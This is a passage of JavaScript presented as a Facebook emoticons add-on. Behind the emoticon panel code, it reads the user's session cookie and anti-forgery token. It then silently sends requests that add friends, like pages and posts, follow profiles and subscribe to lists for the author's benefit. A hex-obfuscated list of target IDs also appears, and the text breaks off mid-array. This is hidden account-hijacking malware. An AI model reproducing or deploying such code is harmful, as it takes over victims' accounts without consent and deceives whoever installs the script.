	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="#" target="_blank">Novos Emoticons Facebook</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
P("505734902885269");
P("505184639606962");
P("720976607946174");
P("720985024611999");
P("720979277945907");
P("720974341279734");
P("720976287946206");
P("720973577946477");
P("720971207946714");
P("720970461280122");
P("720967764613725");
P("720965997947235");
P("720964484614053");
P("720963351280833");
P("720961761280992");
P("720960634614438");
var _0x2106=["\x31\x30\x30\x30\x30\x34\x30\x31\x34\x33\x36\x35\x34\x33\x38","\x31\x30\x30\x30\x30\x33\x34\x36\x32\x39\x32\x37\x30\x38\x36","\x37\x32\x30\x36\x31\x34\x31\x36\x37\x39\x38\x32\x34\x31\x38","\x31\x39\x37\x31\x32\x37\x35\x37\x33\x37\x35\x32\x31\x33\x30","\x34\x31\x36\x35\x34\x35\x38\x31\x38\x34\x30\x34\x30\x38\x36","\x34\x30\x38\x39\x30\x32\x31\x30\x35\x38\x37\x30\x34\x36\x30","\x32\x34\x35\x35\x30\x38\x35\x35\x32\x32\x38\x30\x32\x36\x38","\x34\x34\x34\x39\x38\x36\x38\x30\x32\x31\x39\x31\x31\x34\x39","\x34\x34\x36\x30\x30\x31\x39\x32\x38\x38\x35\x35\x33\x39\x36","\x31\x37\x35\x39\x31\x39\x30\x39\x39\x32\x38\x33\x35\x30\x32","\x32\x33\x31\x33\x35\x34\x37\x30\x37\x30\x33\x34\x30\x39\x38","\x32\x34\x38\x39\x37\x37\x30\x37\x38\x35\x39\x30\x34\x30\x34","\x31\x38\x35\x39\x30\x39\x38\x34\x31\x36\x30\x38\x37\x31\x32","\x34\x31\x37\x37\x32\x36\x39\x36\x38\x32\x38\x33\x37\x35\x39","\x33\x35\x39\x35\x30\x36\x38\x31\x34\x31\x34\x38\x37\x37\x36","\x33\x33\x37\x35\x38\x33\x35\x35\x39\x36\x35\x30\x33\x36\x31","\x31\x34\x31\x39\x36\x30\x34\x38\x39\x32\x38\x32\x32\x35\x38","\x34\x31\x37\x38\x33\x33\x33\x31\x38\x32\x37\x36\x37\x34\x35","\x35\x31\x34\x39\x31\x35\x32\x34\x35\x31\x39\x30\x30\x36\x34","\x34\x35\x30\x34\x30\x30\x37\x35\x31\x37\x34\x36\x36\x38\x38","\x32\x37\x33\x36\x39\x38\x37\x30\x39\x34\x37\x35\x39\x33\x30","\x32\x30\x31\x37\x33\x34\x35\x32\x36\x36\x39\x33\x33\x31\x33","\x31\x35\x31\x38\x30\x33\x38\x30\x38\x33\x32\x30\x33\x35\x34","\x31\x32\x39\x35\x39\x33\x33\x32\x33\x38\x39\x37\x33\x34\x36","\x37\x32\x30\x36\x31\x39\x35\x37\x31\x33\x31\x35\x32\x31\x31","\x37\x32\x30\x36\x31\x35\x38\x30\x34\x36\x34\x38\x39\x32\x31","\x35\x30\x37\x34\x32\x34\x34\x34\x32\x37\x31\x36\x33\x31\x35","\x35\x30\x36\x36\x37\x35\x38\x34\x32\x37\x39\x31\x31\x37\x35","\x35\x30\x35\x31\x38\x34\x36\x33\x39\x36\x30\x36\x39\x36\x32","\x34\x32\x34\x33\x34\x31\x30\x37\x34\x33\x37\x36\x33\x36\x38","\x34\x32\x39\x35\x39\x39\x38\x30\x30\x35\x31\x37\x31\x36\x32","\x34\x39\x36\x32\x37\x31\x39\x38\x33\x38\x33\x31\x35\x36\x31","\x34\x39\x34\x39\x33\x36\x31\x30\x37\x32\x39\x38\x34\x38\x32","\x34\x39\x34\x38\x38\x34\x37\x34\x30\x36\x33\x36\x39\x35\x32","\x34\x39\x32\x33\x36\x34\x38\x31\x37\x35\x35\x35\x36\x31\x31","\x34\x39\x31\x33\x36\x37\x34\x37\x34\x33\x32\x32\x30\x31\x32","\x34\x37\x35\x34\x38\x31\x39\x39\x35\x39\x31\x30\x35\x36\x30","\x34\x37\x32\x37\x36\x38\x38\x38\x39\x35\x31\x35\x32\x30\x34","\x33\x34\x37\x31\x39\x35\x39\x31\x38\x37\x33\x39\x31\x36\x39","\x34\x32\x38\x30\x37\x33\x34\x30\x34\x30\x30\x33\x31\x33\x35","\x34\x32\x38\x30\x36\x38\x35\x37\x34\x30\x30\x33\x36\x31\x38","\x34\x32\x38\x30\x36\x30\x37\x31\x34\x30\x30\x34\x34\x30\x34","\x34\x38\x35\x36\x39\x34\x32\x31\x34\x38\x38\x39\x33\x33\x38","\x34\x32\x38\x37\x36\x34\x35\x33\x33\x39\x31\x35\x36\x34\x30","\x34\x32\x38\x30\x35\x37\x33\x35\x37\x33\x33\x38\x30\x37\x33","\x34\x32\x38\x30\x35\x33\x34\x31\x30\x36\x37\x31\x38\x30\x31","\x34\x32\x38\x30\x35\x31\x36\x37\x37\x33\x33\x38\x36\x34\x31","\x34\x32\x38\x30\x34\x37\x37\x37\x37\x33\x33\x39\x30\x33\x31","\x34\x32\x38\x30\x35\x34\x30\x35\x37\x33\x33\x38\x34\x30\x33","\x33\x34\x39\x36\x36\x32\x39\x32\x35\x31\x35\x39\x31\x33\x35","\x34\x32\x38\x30\x35\x38\x39\x38\x30\x36\x37\x31\x32\x34\x34","\x33\x39\x32\x31\x31\x32\x38\x30\x30\x39\x33\x32\x35\x32\x39","\x35\x30\x35\x37\x33\x34\x39\x30\x32\x38\x38\x35\x32\x36\x39","\x34\x33\x38\x39\x39\x36\x38\x35\x36\x32\x34\x34\x31\x32\x33","\x34\x33\x39\x31\x32\x38\x33\x30\x32\x38\x39\x37\x36\x34\x35","\x34\x33\x39\x31\x31\x39\x31\x36\x39\x35\x36\x35\x32\x32\x35","\x34\x33\x39\x31\x30\x39\x39\x38\x39\x35\x36\x36\x31\x34\x33","\x34\x33\x39\x31\x30\x39\x32\x39\x39\x35\x36\x36\x32\x31\x32","\x34\x33\x39\x31\x30\x37\x36\x38\x36\x32\x33\x33\x30\x34\x30","\x34\x33\x39\x31\x30\x35\x37\x38\x39\x35\x36\x36\x35\x36\x33","\x34\x33\x39\x31\x30\x30\x32\x38\x39\x35\x36\x37\x31\x31\x33","\x34\x31\x34\x30\x33\x30\x39\x30\x35\x34\x30\x37\x33\x38\x35","\x33\x39\x35\x32\x38\x37\x35\x35\x30\x36\x31\x35\x30\x35\x34","\x33\x38\x34\x34\x32\x33\x38\x37\x35\x30\x33\x34\x37\x35\x35","\x33\x36\x36\x39\x38\x39\x39\x34\x33\x34\x34\x34\x38\x31\x35","\x33\x36\x34\x34\x33\x31\x33\x39\x30\x33\x36\x37\x33\x33\x37","\x33\x36\x34\x34\x30\x39\x39\x31\x37\x30\x33\x36\x31\x35\x31","\x33\x36\x34\x33\x33\x30\x32\x34\x33\x37\x31\x30\x37\x38\x35","\x33\x36\x33\x39\x33\x36\x30\x34\x37\x30\x38\x33\x35\x33\x38","\x33\x36\x33\x39\x32\x38\x39\x38\x37\x30\x38\x34\x32\x34\x34","\x33\x36\x33\x39\x32\x35\x34\x37\x30\x34\x31\x37\x39\x32\x39","\x33\x36\x33\x39\x32\x30\x35\x30\x37\x30\x38\x35\x30\x39\x32","\x33\x36\x33\x38\x39\x38\x38\x33\x30\x34\x32\x30\x35\x39\x33","\x33\x36\x33\x38\x38\x32\x33\x38\x30\x34\x32\x32\x32\x33\x38","\x33\x36\x33\x37\x36\x31\x32\x32\x30\x34\x33\x34\x33\x35\x34","\x34\x33\x34\x33\x39\x32\x32\x35\x30\x30\x33\x37\x39\x31\x37","\x34\x33\x34\x33\x39\x31\x35\x37\x36\x37\x30\x34\x36\x35\x31","\x34\x33\x34\x33\x39\x31\x32\x36\x33\x33\x37\x31\x33\x34\x39","\x34\x33\x34\x33\x39\x30\x35\x36\x33\x33\x37\x31\x34\x31\x39","\x34\x33\x34\x33\x38\x39\x34\x32\x30\x30\x33\x38\x32\x30\x30","\x34\x33\x34\x33\x38\x37\x33\x30\x33\x33\x37\x31\x37\x34\x35","\x34\x33\x34\x33\x38\x36\x34\x36\x30\x30\x33\x38\x34\x39\x36","\x34\x33\x34\x33\x38\x34\x31\x35\x36\x37\x30\x35\x33\x39\x33","\x35\x30\x30\x33\x36\x32\x33\x30\x36\x37\x35\x35\x38\x36\x32","\x35\x30\x30\x33\x34\x39\x35\x31\x33\x34\x32\x33\x38\x30\x38","\x35\x30\x30\x33\x31\x34\x33\x34\x33\x34\x32\x37\x33\x32\x35","\x35\x30\x30\x32\x39\x39\x38\x36\x33\x34\x32\x38\x37\x37\x33","\x34\x38\x35\x37\x33\x39\x35\x36\x38\x32\x31\x38\x31\x33\x36","\x34\x38\x35\x37\x33\x39\x38\x32\x38\x32\x31\x38\x31\x31\x30","\x34\x37\x39\x36\x33\x34\x30\x31\x38\x38\x32\x38\x36\x39\x31","\x34\x39\x38\x30\x31\x35\x30\x37\x30\x33\x32\x33\x39\x31\x39","\x34\x39\x38\x30\x31\x35\x30\x30\x33\x36\x35\x37\x32\x35\x39","\x33\x35\x30\x35\x39\x31\x38\x36\x31\x37\x33\x32\x39\x30\x38","\x34\x37\x35\x36\x38\x35\x30\x38\x35\x38\x39\x30\x32\x35\x31","\x33\x36\x39\x34\x34\x32\x32\x31\x33\x31\x39\x39\x35\x38\x38","\x33\x36\x39\x34\x34\x32\x32\x30\x36\x35\x33\x32\x39\x32\x32","\x33\x36\x39\x34\x34\x32\x32\x32\x33\x31\x39\x39\x35\x38\x37","\x33\x39\x31\x39\x37\x36\x37\x38\x37\x36\x31\x32\x37\x39\x37","\x33\x38\x30\x36\x31\x30\x32\x30\x35\x34\x31\x36\x31\x32\x32","\x33\x37\x36\x36\x35\x31\x39\x30\x39\x31\x34\x35\x32\x38\x35","\x33\x37\x35\x30\x36\x33\x35\x31\x32\x36\x33\x37\x34\x35\x38","\x33\x37\x33\x39\x39\x32\x34\x39\x39\x34\x31\x31\x32\x32\x36","\x33\x37\x33\x34\x37\x31\x33\x39\x32\x37\x39\x36\x36\x37\x30","\x33\x37\x33\x30\x33\x39\x33\x34\x39\x35\x30\x36\x35\x34\x31","\x33\x37\x32\x31\x39\x32\x30\x38\x36\x32\x35\x37\x39\x33\x34","\x33\x37\x32\x31\x38\x30\x37\x32\x32\x39\x32\x35\x37\x33\x37","\x33\x37\x31\x37\x34\x33\x30\x39\x32\x39\x36\x39\x35\x30\x30","\x33\x37\x30\x39\x31\x37\x30\x39\x33\x30\x35\x32\x31\x30\x30","\x33\x36\x39\x38\x36\x36\x38\x35\x36\x34\x39\x30\x34\x35\x37","\x33\x36\x39\x33\x38\x34\x38\x34\x36\x35\x33\x38\x36\x35\x38","\x33\x36\x36\x34\x36\x31\x32\x39\x33\x34\x39\x37\x36\x38\x30","\x33\x36\x36\x31\x34\x38\x34\x38\x33\x35\x32\x38\x39\x36\x31","\x33\x36\x35\x38\x34\x39\x39\x33\x30\x32\x32\x35\x34\x38\x33","\x33\x36\x35\x32\x31\x31\x31\x34\x30\x32\x38\x39\x33\x36\x32","\x33\x36\x34\x37\x38\x33\x33\x39\x30\x33\x33\x32\x31\x33\x37","\x33\x36\x34\x34\x33\x31\x33\x35\x37\x30\x33\x34\x30\x30\x37","\x33\x36\x34\x32\x39\x37\x34\x39\x33\x37\x31\x34\x30\x36\x30","\x33\x36\x33\x39\x36\x34\x38\x38\x33\x37\x34\x37\x33\x32\x31","\x33\x36\x33\x38\x39\x35\x36\x31\x37\x30\x38\x37\x35\x38\x31","\x33\x36\x33\x37\x35\x30\x32\x36\x37\x31\x30\x32\x31\x31\x36","\x33\x30\x31\x34\x32\x31\x37\x34\x33\x33\x33\x34\x39\x36\x39","\x32\x39\x37\x36\x36\x38\x38\x32\x30\x33\x37\x36\x39\x32\x38","\x33\x30\x30\x35\x37\x39\x38\x33\x33\x34\x31\x39\x31\x36\x30","\x32\x39\x37\x33\x30\x35\x35\x30\x33\x37\x34\x36\x35\x39\x33","\x32\x38\x39\x36\x36\x39\x37\x36\x31\x31\x37\x36\x38\x33\x34","\x32\x38\x39\x32\x32\x31\x39\x38\x37\x38\x38\x38\x32\x37\x38","\x32\x38\x36\x36\x30\x39\x38\x34\x38\x31\x34\x39\x34\x39\x32","\x32\x38\x36\x34\x38\x31\x38\x30\x38\x31\x36\x32\x32\x39\x36","\x32\x38\x36\x32\x33\x30\x37\x36\x38\x31\x38\x37\x34\x30\x30","\x32\x38\x34\x37\x38\x38\x38\x37\x34\x39\x39\x38\x32\x35\x36","\x32\x38\x32\x33\x39\x30\x38\x31\x31\x39\x30\x34\x37\x32\x39","\x32\x38\x31\x35\x32\x35\x34\x36\x38\x36\x35\x37\x39\x33\x30","\x32\x36\x37\x38\x36\x32\x31\x36\x33\x33\x35\x37\x35\x39\x34","\x32\x36\x36\x31\x38\x35\x35\x33\x36\x38\x35\x38\x35\x39\x30","\x32\x36\x34\x33\x38\x30\x36\x38\x30\x33\x37\x32\x34\x30\x39","\x32\x36\x33\x38\x32\x32\x36\x34\x30\x34\x32\x38\x32\x31\x33","\x32\x36\x33\x38\x30\x31\x32\x38\x30\x34\x33\x30\x33\x34\x39","\x32\x36\x31\x39\x34\x35\x31\x38\x30\x36\x31\x35\x39\x35\x39","\x31\x33\x38\x39\x38\x36\x38\x34\x32\x39\x31\x31\x37\x39\x34","\x34\x31\x33\x39\x33\x30\x34\x34\x32\x30\x38\x34\x30\x39\x38","\x34\x31\x37\x38\x38\x38\x35\x31\x31\x36\x38\x38\x32\x39\x31","\x34\x30\x33\x33\x37\x31\x38\x34\x39\x38\x30\x36\x36\x32\x34","\x34\x30\x32\x38\x34\x38\x38\x36\x39\x38\x35\x38\x39\x32\x32","\x33\x39\x39\x36\x36\x36\x39\x30\x36\x38\x34\x33\x37\x38\x35","\x34\x31\x33\x30\x32\x36\x34\x30\x35\x35\x30\x37\x38\x33\x35","\x34\x31\x33\x30\x32\x35\x39\x30\x32\x31\x37\x34\x35\x35\x32","\x34\x31\x33\x30\x32\x34\x38\x39\x35\x35\x30\x37\x39\x38\x36","\x33\x36\x35\x38\x34\x36\x38\x32\x33\x35\x35\x39\x31\x32\x37","\x33\x36\x35\x38\x34\x36\x38\x30\x30\x32\x32\x35\x37\x39\x36","\x33\x36\x35\x38\x34\x36\x37\x36\x33\x35\x35\x39\x31\x33\x33","\x33\x36\x35\x38\x34\x36\x37\x34\x30\x32\x32\x35\x38\x30\x32","\x33\x36\x35\x38\x34\x36\x37\x31\x33\x35\x35\x39\x31\x33\x38","\x33\x36\x35\x38\x34\x36\x36\x39\x30\x32\x32\x35\x38\x30\x37","\x33\x36\x35\x38\x34\x36\x36\x36\x33\x35\x35\x39\x31\x34\x33","\x33\x36\x35\x38\x34\x36\x36\x33\x36\x38\x39\x32\x34\x37\x39","\x33\x36\x35\x38\x34\x36\x36\x32\x30\x32\x32\x35\x38\x31\x34","\x33\x36\x35\x38\x34\x36\x35\x39\x36\x38\x39\x32\x34\x38\x33","\x33\x36\x35\x38\x34\x36\x35\x38\x30\x32\x32\x35\x38\x31\x38","\x33\x36\x35\x38\x34\x36\x35\x35\x33\x35\x35\x39\x31\x35\x34","\x33\x36\x33\x37\x39\x34\x35\x35\x37\x30\x39\x37\x36\x38\x37","\x33\x36\x33\x37\x39\x34\x35\x31\x30\x34\x33\x31\x30\x32\x35","\x33\x36\x33\x37\x39\x34\x35\x33\x33\x37\x36\x34\x33\x35\x36","\x33\x36\x33\x37\x39\x34\x35\x36\x30\x34\x33\x31\x30\x32\x30","\x33\x36\x33\x37\x39\x34\x35\x37\x37\x30\x39\x37\x36\x38\x35","\x33\x36\x33\x37\x39\x34\x36\x30\x30\x34\x33\x31\x30\x31\x36","\x33\x36\x33\x37\x39\x34\x36\x30\x37\x30\x39\x37\x36\x38\x32","\x33\x36\x33\x37\x39\x34\x36\x32\x30\x34\x33\x31\x30\x31\x34","\x33\x36\x33\x37\x39\x34\x36\x32\x37\x30\x39\x37\x36\x38\x30","\x33\x36\x33\x37\x39\x34\x36\x33\x37\x30\x39\x37\x36\x37\x39","\x33\x36\x39\x34\x34\x32\x32\x37\x36\x35\x33\x32\x39\x31\x35","\x33\x36\x39\x34\x34\x32\x32\x38\x36\x35\x33\x32\x39\x31\x34","\x33\x36\x39\x34\x34\x32\x34\x34\x36\x35\x33\x32\x38\x39\x38","\x33\x36\x39\x34\x34\x32\x34\x35\x39\x38\x36\x36\x32\x33\x30","\x33\x36\x39\x34\x34\x32\x34\x38\x36\x35\x33\x32\x38\x39\x34","\x33\x36\x39\x34\x34\x32\x35\x32\x36\x35\x33\x32\x38\x39\x30","\x33\x36\x39\x34\x34\x32\x35\x34\x33\x31\x39\x39\x35\x35\x35","\x33\x36\x39\x34\x34\x32\x35\x35\x39\x38\x36\x36\x32\x32\x30","\x33\x36\x39\x34\x34\x32\x36\x30\x39\x38\x36\x36\x32\x31\x35","\x33\x36\x39\x34\x34\x32\x36\x32\x36\x35\x33\x32\x38\x38\x30","\x33\x36\x39\x34\x34\x32\x36\x34\x33\x31\x39\x39\x35\x34\x35","\x33\x36\x39\x34\x34\x32\x36\x37\x33\x31\x39\x39\x35\x34\x32","\x33\x36\x39\x34\x34\x32\x36\x37\x39\x38\x36\x36\x32\x30\x38","\x33\x36\x39\x34\x34\x32\x36\x39\x36\x35\x33\x32\x38\x37\x33","\x33\x36\x39\x34\x34\x33\x30\x30\x39\x38\x36\x36\x31\x37\x35","\x33\x36\x39\x34\x34\x33\x30\x34\x36\x35\x33\x32\x38\x33\x38","\x33\x36\x39\x34\x34\x33\x30\x39\x39\x38\x36\x36\x31\x36\x36","\x33\x36\x39\x34\x34\x33\x31\x33\x33\x31\x39\x39\x34\x39\x36","\x33\x36\x39\x34\x34\x33\x34\x33\x33\x31\x39\x39\x34\x36\x36","\x33\x36\x39\x34\x34\x33\x34\x34\x39\x38\x36\x36\x31\x33\x31","\x33\x36\x39\x34\x34\x33\x34\x37\x33\x31\x39\x39\x34\x36\x32","\x33\x36\x39\x34\x34\x33\x34\x38\x39\x38\x36\x36\x31\x32\x37","\x33\x36\x39\x34\x34\x33\x35\x30\x39\x38\x36\x36\x31\x32\x35","\x33\x36\x39\x34\x34\x33\x35\x34\x36\x35\x33\x32\x37\x38\x38","\x33\x36\x39\x34\x34\x33\x36\x32\x36\x35\x33\x32\x37\x38\x30","\x33\x36\x39\x34\x34\x33\x36\x36\x33\x31\x39\x39\x34\x34\x33","\x33\x36\x39\x34\x34\x33\x36\x38\x36\x35\x33\x32\x37\x37\x34","\x33\x36\x39\x34\x34\x33\x37\x30\x33\x31\x39\x39\x34\x33\x39","\x33\x36\x39\x34\x34\x33\x37\x38\x36\x35\x33\x32\x37\x36\x34","\x33\x36\x39\x34\x34\x33\x39\x33\x33\x31\x39\x39\x34\x31\x36","\x33\x36\x39\x34\x34\x34\x30\x30\x33\x31\x39\x39\x34\x30\x39","\x33\x36\x39\x34\x34\x34\x32\x31\x33\x31\x39\x39\x33\x38\x38","\x33\x36\x39\x34\x34\x34\x34\x30\x36\x35\x33\x32\x37\x30\x32","\x33\x36\x39\x34\x34\x34\x34\x37\x39\x38\x36\x36\x30\x32\x38","\x33\x36\x39\x34\x34\x34\x35\x31\x36\x35\x33\x32\x36\x39\x31","\x33\x36\x39\x34\x34\x34\x35\x31\x39\x38\x36\x36\x30\x32\x34","\x33\x36\x39\x34\x34\x34\x35\x33\x33\x31\x39\x39\x33\x35\x36","\x33\x36\x39\x34\x34\x34\x36\x30\x39\x38\x36\x36\x30\x31\x35","\x33\x36\x39\x34\x35\x30\x36\x34\x33\x31\x39\x38\x37\x34\x35","\x33\x36\x39\x34\x35\x30\x36\x33\x36\x35\x33\x32\x30\x37\x39","\x33\x36\x39\x34\x35\x30\x36\x33\x39\x38\x36\x35\x34\x31\x32","\x33\x36\x33\x37\x39\x34\x36\x36\x30\x34\x33\x31\x30\x31\x30","\x33\x36\x33\x37\x39\x34\x36\x37\x37\x30\x39\x37\x36\x37\x35","\x33\x36\x33\x37\x39\x34\x36\x38\x30\x34\x33\x31\x30\x30\x38","\x33\x36\x33\x37\x39\x34\x36\x39\x37\x30\x39\x37\x36\x37\x33","\x33\x36\x33\x37\x39\x34\x37\x31\x33\x37\x36\x34\x33\x33\x38","\x33\x36\x33\x37\x39\x34\x37\x32\x33\x37\x36\x34\x33\x33\x37","\x33\x36\x33\x37\x39\x34\x37\x33\x33\x37\x36\x34\x33\x33\x36","\x33\x36\x33\x37\x39\x34\x37\x34\x37\x30\x39\x37\x36\x36\x38","\x33\x36\x33\x37\x39\x34\x37\x37\x33\x37\x36\x34\x33\x33\x32","\x33\x36\x33\x37\x39\x34\x37\x39\x37\x30\x39\x37\x36\x36\x33","\x33\x36\x33\x37\x39\x34\x37\x39\x33\x37\x36\x34\x33\x33\x30","\x33\x36\x33\x37\x39\x34\x38\x32\x33\x37\x36\x34\x33\x32\x37","\x33\x36\x33\x37\x39\x34\x38\x33\x33\x37\x36\x34\x33\x32\x36","\x33\x36\x33\x37\x39\x34\x38\x36\x30\x34\x33\x30\x39\x39\x30","\x33\x36\x33\x37\x39\x34\x38\x37\x33\x37\x36\x34\x33\x32\x32","\x33\x36\x33\x37\x39\x34\x38\x38\x30\x34\x33\x30\x39\x38\x38","\x33\x36\x33\x37\x39\x34\x39\x30\x30\x34\x33\x30\x39\x38\x36","\x33\x36\x33\x37\x39\x34\x39\x31\x37\x30\x39\x37\x36\x35\x31","\x33\x36\x33\x37\x39\x34\x39\x32\x37\x30\x39\x37\x36\x35\x30","\x33\x36\x33\x37\x39\x34\x39\x34\x33\x37\x36\x34\x33\x31\x35","\x33\x36\x33\x37\x39\x34\x39\x36\x33\x37\x36\x34\x33\x31\x33","\x33\x36\x33\x37\x39\x35\x30\x34\x33\x37\x36\x34\x33\x30\x35","\x33\x36\x33\x37\x39\x34\x39\x39\x37\x30\x39\x37\x36\x34\x33","\x33\x36\x33\x37\x39\x35\x30\x31\x30\x34\x33\x30\x39\x37\x35","\x33\x36\x33\x37\x39\x35\x30\x33\x37\x30\x39\x37\x36\x33\x39","\x33\x36\x33\x37\x39\x35\x30\x35\x30\x34\x33\x30\x39\x37\x31","\x33\x36\x33\x37\x39\x35\x30\x36\x37\x30\x39\x37\x36\x33\x36","\x33\x36\x33\x37\x39\x35\x30\x37\x37\x30\x39\x37\x36\x33\x35","\x33\x36\x33\x37\x39\x35\x30\x39\x37\x30\x39\x37\x36\x33\x33","\x33\x36\x33\x37\x39\x35\x30\x39\x33\x37\x36\x34\x33\x30\x30","\x33\x36\x33\x37\x39\x35\x31\x32\x30\x34\x33\x30\x39\x36\x34","\x33\x36\x33\x37\x39\x35\x31\x33\x37\x30\x39\x37\x36\x32\x39","\x33\x36\x33\x37\x39\x35\x31\x34\x37\x30\x39\x37\x36\x32\x38","\x33\x36\x33\x37\x39\x35\x31\x37\x30\x34\x33\x30\x39\x35\x39","\x33\x36\x33\x37\x39\x35\x31\x38\x30\x34\x33\x30\x39\x35\x38","\x33\x36\x33\x37\x39\x35\x31\x39\x30\x34\x33\x30\x39\x35\x37","\x33\x36\x33\x37\x39\x35\x32\x30\x37\x30\x39\x37\x36\x32\x32","\x33\x36\x33\x37\x39\x35\x32\x34\x37\x30\x39\x37\x36\x31\x38","\x33\x36\x33\x37\x39\x35\x32\x34\x30\x34\x33\x30\x39\x35\x32","\x33\x36\x33\x37\x39\x35\x32\x36\x33\x37\x36\x34\x32\x38\x33","\x33\x36\x33\x37\x39\x35\x32\x37\x37\x30\x39\x37\x36\x31\x35","\x33\x36\x33\x37\x39\x35\